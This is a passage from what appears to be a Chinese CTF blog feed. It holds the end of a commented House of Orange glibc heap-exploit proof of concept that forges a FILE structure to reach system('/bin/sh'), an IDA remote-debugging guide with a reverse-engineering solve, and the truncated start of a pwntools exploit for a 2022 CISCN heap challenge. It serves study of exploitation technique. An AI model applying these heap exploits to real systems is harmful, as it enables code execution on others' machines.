class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Finally the heap looks like this:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     heap start                                             new heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Note that the above chunk will be allocated in a different page</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      top chunk so we could overwrite the chunk&#x27;s size.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      of this chunk in the unsorted bin list.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      There are two common ways to exploit the current state:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      is triggered when the libc detects any bogus state of the heap.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      More about file-pointer exploitation can be found here:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      currently point to the libc&#x27;s main_arena.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    io_list_all = top[<span class="hljs-number">2</span>] + <span class="hljs-number">0x9a8</span>;<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      We plan to overwrite the fd and bk pointers of the old top,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      which has now been added to the unsorted bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      When malloc tries to satisfy a request by splitting this free chunk</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      in libc&#x27;s main_arena.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      case.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br> <br><br>    top[<span class="hljs-number">3</span>] = io_list_all - <span class="hljs-number">0x10</span>;<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    <span class="hljs-built_in">memcpy</span>( ( <span class="hljs-type">char</span> *) top, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-number">8</span>);<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      in _IO_list_all.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The address of the next file pointer is located at base_address+0x68.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      This corresponds to smallbin-4, which holds all the smallbins of</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      in this list first, therefore, iterates over the list.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      therefore, occupying the smallbin[4] location in the main_arena and</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      In addition to sorting, malloc will also perform certain size checks on them,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      so after sorting the old top chunk and following the bogus fd pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      to _IO_list_all, it will check the corresponding size field, detect</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      and finally triggering the abort call that gets our chain rolling.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here is the corresponding code in the libc:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0x61</span>;<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      required by the function _IO_flush_all_lockp and tested here:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      We want to satisfy the first condition:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    FILE *fp = (FILE *) top;<br><br><br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    fp-&gt;_mode = <span class="hljs-number">0</span>; <span class="hljs-comment">// top+0xc0</span><br><br><br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    fp-&gt;_IO_write_base = (<span class="hljs-type">char</span> *) <span class="hljs-number">2</span>; <span class="hljs-comment">// top+0x20</span><br><br>    fp-&gt;_IO_write_ptr = (<span class="hljs-type">char</span> *) <span class="hljs-number">3</span>; <span class="hljs-comment">// top+0x28</span><br><br><br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      4) Finally set the jump table to controlled memory and place system there.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The jump table pointer is right after the FILE struct:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      base_address+sizeof(FILE) = jump_table</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    <span class="hljs-type">size_t</span> *jump_table = &amp;top[<span class="hljs-number">12</span>]; <span class="hljs-comment">// controlled memory</span><br><br>    jump_table[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) &amp;winner;<br><br>    *(<span class="hljs-type">size_t</span> *) ((<span class="hljs-type">size_t</span>) fp + <span class="hljs-keyword">sizeof</span>(FILE)) = (<span class="hljs-type">size_t</span>) jump_table; <span class="hljs-comment">// top+0xd8</span><br><br><br><br><br><br>    <span class="hljs-comment">/* Finally, trigger the whole chain by calling malloc */</span><br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><br><br><br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     The libc&#x27;s error message will be printed to the screen</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     But you&#x27;ll get a shell anyways.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   */</span><br><br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">winner</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr)</span><br><br>&#123; <br><br>    system(ptr);<br><br>    syscall(SYS_exit, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwnï¼šä»å…¥é—¨åˆ°å…¥åŸ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å­¦ä¹ ç”¨IDAè¿œç¨‹è°ƒè¯•ELFæ–‡ä»¶</title>
    <link href="/2022/07/06/Re/IDA_remote_dbg/"/>
    <url>/2022/07/06/Re/IDA_remote_dbg/</url>
    
    <content type="html"><![CDATA[<h2 id="How-to-IDA-remote-dbg"><a href="#How-to-IDA-remote-dbg" class="headerlink" title="How to IDA_remote_dbg"></a>How to IDA_remote_dbg</h2><ol><li><p>æ‰¾åˆ°IDAå®‰è£…ç›®å½•ä¸‹ï¼Œdbgsrvç›®å½•ä¸­çš„<code>linux_server</code>ï¼ˆ32ä½ç¨‹åºï¼‰å’Œ<code>linux_server64</code>ï¼ˆ64ä½ç¨‹åºï¼‰ï¼Œå°†æ–‡ä»¶æ‹–åˆ°è™šæ‹Ÿæœºé‡Œï¼Œå¹¶ä¿è¯å’Œéœ€è¦è°ƒè¯•çš„æ–‡ä»¶åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚</p></li><li><p>ä½¿ç”¨å‘½ä»¤èµ‹æƒé™å¹¶æ£€æŸ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 777 linux_server64<br>./linux_server64<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å‡ºç°ä»¥ä¸‹æ¶ˆæ¯å³ä¸ºæˆåŠŸ</span><br>IDA Linux 64-bit remote debug server(ST) v7.7.27. Hex-Rays (c) 2004-2022<br>Listening on 0.0.0.0:23946...<br></code></pre></td></tr></table></figure></li><li><p>åœ¨IDAçš„Debuggerä¸­é€‰æ‹©<code>Remote Linux Debugger</code>ã€‚</p></li><li><p>åœ¨<code>process options</code>ä¸­åšé…ç½®ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><ul><li>Application ã€‹æ–‡ä»¶åœ°å€</li><li>Input file ã€‹æ–‡ä»¶åœ°å€</li><li>Directory ã€‹æ–‡ä»¶æ‰€åœ¨ç›®å½•</li><li>Parameters ã€‹æ— éœ€æ›´æ”¹</li><li>Hostname ã€‹è™šæ‹Ÿæœºçš„ip</li><li>Port ã€‹æ— éœ€æ”¹åŠ¨ï¼Œé»˜è®¤ä¸º23946å³å¯</li><li>Password ã€‹è™šæ‹Ÿæœºå¯†ç </li></ul><p>æŸ¥æ‰¾ipçš„å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">ip addr<br><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    link/ether 00:0c:29:76:f2:4a brd ff:ff:ff:ff:ff:ff<br>    altname enp2s1<br>    inet 192.168.188.132/24 brd 192.168.188.255 scope global dynamic noprefixroute ens33<br>       valid_lft 1589sec preferred_lft 1589sec<br>    inet6 fe80::4bb0:bbb3:b3d1:1a28/64 scope link noprefixroute <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure></li><li><p>å…ˆåœ¨è™šæ‹Ÿæœºé‡Œå¯åŠ¨dbgï¼Œå†åœ¨IDAä¸­å¯åŠ¨è°ƒè¯•å³å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./linux_server64<br></code></pre></td></tr></table></figure></li></ol><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>é¢˜ç›®æµç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">181</span>; ++i )<br>    judge[i] ^= <span class="hljs-number">0xC</span>u;<span class="hljs-comment">// judgeæ˜¯ä½äºdataæ®µä¸Šçš„ä¸€ä¸ªæ•°ç»„</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%20s&quot;</span>, s);<br>  v5 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">14</span> &amp;&amp; (*(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> (__fastcall **)(<span class="hljs-type">char</span> *))judge)(s) )<span class="hljs-comment">// judgeå˜ä¸ºäº†å‡½æ•°</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Right!&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½•ä¸º__fastcallï¼Ÿè¿™æ˜¯ä¸€ç§è°ƒç”¨çº¦å®šï¼Œå¯ä»¥è¯´å‡½æ•°çš„è°ƒç”¨çº¦å®šï¼Œå…¶ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªDWORDå‚æ•°é€šè¿‡ecxå’Œedxä¼ é€’ï¼Œé™¤æ­¤è°ƒç”¨çº¦å®šä»¥å¤–ï¼Œè¿˜æœ‰ä¸€äº›å¸¸è§çš„è°ƒç”¨çº¦å®šï¼šstdcallã€cdeclã€thiscallã€nakedcallã€‚</p><p>å¯ä»¥çœ‹åˆ°åœ¨è°ƒç”¨judgeå‡½æ•°ä¹‹å‰ï¼Œå¯¹judgeçš„å­—èŠ‚è¿›è¡Œäº†å¼‚æˆ–æ“ä½œï¼Œä½¿å¾—æˆ‘ä»¬éš¾ä»¥ç”¨é™æ€åˆ†æçš„æ–¹æ³•æ¥åˆ†æå…¶æµç¨‹ï¼Œé‡‡ç”¨åŠ¨é™ç»“åˆï¼Œåœ¨å…¶è¿›è¡Œäº†å¼‚æˆ–æ“ä½œä¹‹åä¸‹æ–­ç‚¹ï¼Œé€šè¿‡åŠ¨è°ƒï¼Œå‘ç°äº†judgeçš„çœŸé¢ç›®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">judge</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> v2[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+8h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+Dh] [rbp-1Bh] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp-4h]</span><br><br>  qmemcpy(v2, <span class="hljs-string">&quot;fmcd&quot;</span>, <span class="hljs-number">4</span>);<br>  v2[<span class="hljs-number">4</span>] = <span class="hljs-number">127</span>;<br>  qmemcpy(v3, <span class="hljs-string">&quot;k7d;V`;np&quot;</span>, <span class="hljs-keyword">sizeof</span>(v3));<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i )<br>    *(_BYTE *)(i + a1) ^= i;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_BYTE *)(i + a1) != v2[i] )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>WPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&#x27;&#x27;&#x27;fmcd\x7Fk7d;V`;np&#x27;&#x27;&#x27;</span><br>rt = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    rt += <span class="hljs-built_in">chr</span>(<br>        <span class="hljs-built_in">ord</span>(s[i]) ^ i<br>    )<br><br><span class="hljs-built_in">print</span>(rt)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reï¼šyyçœŸçš„é€†ä¸åŠ¨</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 ciscn å¤èµ›</title>
    <link href="/2022/07/03/CTF_competition/2022ciscn_again/"/>
    <url>/2022/07/03/CTF_competition/2022ciscn_again/</url>
    
    <content type="html"><![CDATA[<h2 id="duck"><a href="#duck" class="headerlink" title="duck"></a>duck</h2><p>ä¸€é“glibc2.34çš„ç»å…¸å †é¢˜ï¼Œå­˜åœ¨uafçš„æ¼æ´ï¼Œå­¦ä¹ ä¸¤ç§åˆ©ç”¨æ–¹æ³•ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="http://blog.nsfocus.net/glibc-234/">æµ…è°ˆglibcæ–°ç‰ˆæœ¬ä¿æŠ¤æœºåˆ¶åŠç»•è¿‡æ–¹æ³• â€“ ç»¿ç›Ÿç§‘æŠ€æŠ€æœ¯åšå®¢ (nsfocus.net)</a></p></blockquote><h3 id="IOåˆ©ç”¨-IO-doallocbuf"><a href="#IOåˆ©ç”¨-IO-doallocbuf" class="headerlink" title="IOåˆ©ç”¨(_IO_doallocbuf)"></a>IOåˆ©ç”¨(_IO_doallocbuf)</h3><p>é¦–å…ˆä¿®æ”¹IO_doallocbufä¸ºone_gadgetï¼Œç„¶åæ¸…ç©ºstdoutç»“æ„ä½“æŒ‡é’ˆï¼Œä½¿å¾—libcé‡æ–°è°ƒç”¨IO_doallocbufå‡½æ•°ã€‚</p><blockquote><p>ç¬¬ä¸€æ¬¡åšglibc2.34çš„tcacheæœ‰ç‚¹ä¸å¤ªç†Ÿç»ƒï¼Œæ¯”èµ›æœ€åone_gadgeté”™äº†ï¼Œå°±å·®ä¸´é—¨ä¸€è„šï¼Œæœ‰ç‚¹å¯æƒœã€‚â‰§ ï¹ â‰¦</p></blockquote><p>WPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span 